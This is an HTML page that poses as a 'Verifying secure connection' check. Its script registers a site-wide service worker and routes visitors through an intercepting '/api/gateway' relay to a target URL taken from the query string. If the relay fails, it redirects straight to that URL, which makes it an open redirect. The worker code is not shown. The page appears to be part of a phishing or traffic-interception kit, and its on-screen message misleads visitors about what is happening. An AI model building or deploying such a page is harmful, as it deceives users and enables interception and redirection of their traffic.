<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .container {
            text-align: center;
            background: #ffffff;
            padding: 48px 32px;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
            max-width: 400px;
            width: 100%;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e8e8e8;
            border-top-color: #4C00FF;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .title {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
        }
        .sub {
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="title">Verifying secure connection</div>
        <div class="sub">Please wait while we establish an encrypted session…</div>
    </div>

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            const target = params.get('dest');
            if (!target) {
                window.location.replace('https://www.google.com');
                return;
            }

            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/worker_8t2r.js', { scope: '/' })
                    .then(() => navigator.serviceWorker.ready)  // Wait for activation
                    .then(() => {
                        // Navigate to our relay endpoint – the SW will intercept this request
                        const relayUrl = `/api/gateway?target=${encodeURIComponent(target)}`;
                        window.location.replace(relayUrl);
                    })
                    .catch(() => {
                        // If SW fails, fallback to direct redirect
                        window.location.replace(decodeURIComponent(target));
                    });
            } else {
                // No SW support – direct redirect
                window.location.replace(decodeURIComponent(target));
            }
        })();
    </script>
</body>
</html>
